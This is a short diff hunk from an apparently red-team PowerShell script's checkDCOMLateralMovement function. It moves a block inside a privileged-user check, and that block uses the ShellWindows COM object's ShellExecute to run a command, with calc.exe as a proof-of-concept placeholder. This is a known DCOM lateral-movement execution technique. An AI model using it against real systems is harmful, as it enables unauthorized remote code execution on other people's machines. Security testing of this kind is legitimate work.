@@ -1315,26 +1315,26 @@ function checkDCOMLateralMovement {
                 $appSetting = Get-CimInstance -Query "SELECT * FROM Win32_DCOMApplicationSetting WHERE AppID='$appID'"
                 $runAsUser = "None"
 
-                # Check specifically for ShellWindows
-                if ($appName -eq "ShellWindows") { # ShellWindows CLSID
-                    Write-Output "[+] Found ShellWindows: $appID"
-                    # Execute a command via ShellWindows - This only makes sense if it's elevated though... left it for now
-                    try {
-                        $com = [Type]::GetTypeFromCLSID($appID)
-                        $obj = [System.Activator]::CreateInstance($com)
-                        $item = $obj.Item()
-                        $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
-                        Write-Output "[+] Command executed via ShellWindows"
-                    } catch {
-                        Write-Output "[-] Error executing command via ShellWindows: $_"
-                    }
-                }
-
                 if ($appSetting.RunAsUser) {
                     $runAsUser = $localizedUser[$appSetting.RunAsUser.ToLower()].LocalizedName
                 }
 
                 if ($trustedIdentities -contains $runAsUser) {
+                    # Check specifically for ShellWindows
+                    if ($appName -eq "ShellWindows") { # ShellWindows CLSID
+                        Write-Output "[+] Found ShellWindows: $appID"
+                        # Execute a command via ShellWindows - This only makes sense if it's elevated though... left it for now
+                        try {
+                            $com = [Type]::GetTypeFromCLSID($appID)
+                            $obj = [System.Activator]::CreateInstance($com)
+                            $item = $obj.Item()
+                            $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
+                            Write-Output "[+] Command executed via ShellWindows"
+                        } catch {
+                            Write-Output "[-] Error executing command via ShellWindows: $_"
+                        }
+                    }
+
                     Write-Output "[+] AppID $appID is running as a privileged user: $runAsUser"
                     
                     # Get the ACL for the CLSID
